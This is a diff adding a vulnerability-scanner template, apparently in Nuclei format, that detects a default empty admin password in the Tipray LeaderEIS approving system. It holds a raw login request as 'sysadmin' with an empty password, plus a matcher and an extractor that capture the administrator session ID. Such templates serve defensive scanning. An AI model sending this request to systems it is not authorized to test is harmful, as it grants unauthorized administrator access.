@@ -1,0 +1,33 @@
+id: tipray-leadereis-default-password
+info:
+  name: Tipray LeaderEIS Approving System Default Password
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Tipray LeaderEIS approving system has a default password vulnerability. An attacker can log in using the default empty password for the account sysadmin, gaining administrator privileges.
+  tags: default-password
+  reference:
+    - https://www.tipray.com
+http:
+  - raw:
+      - |
+        POST /trwfe/user/logon.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        lastName=sysadmin&password=&j_language=zh-CN
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: regex
+        part: header
+        regex:
+          - "sid="
+    extractors:
+      - type: regex
+        part: header
+        regex:
+          - "sid=([^;]+)"
+        group: 1
